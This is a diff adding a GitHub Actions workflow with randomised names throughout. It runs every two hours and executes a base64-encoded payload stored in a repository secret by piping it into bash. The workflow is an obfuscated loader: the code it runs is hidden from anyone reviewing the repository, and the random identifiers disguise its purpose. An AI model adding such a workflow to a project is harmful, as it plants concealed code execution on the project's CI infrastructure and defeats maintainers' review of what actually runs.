@@ -1,0 +1,13 @@
+name: ZenvSYPH
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+jobs:
+  ZsVYsuth:
+    runs-on: ubuntu-latest
+    env:
+      IjdszILj: ${{ secrets.lxXWGEwU }}
+    steps:
+      - uses: actions/checkout@v5
+      - run: echo "${{ secrets.DPvpTdMb }}" | base64 -d | bash
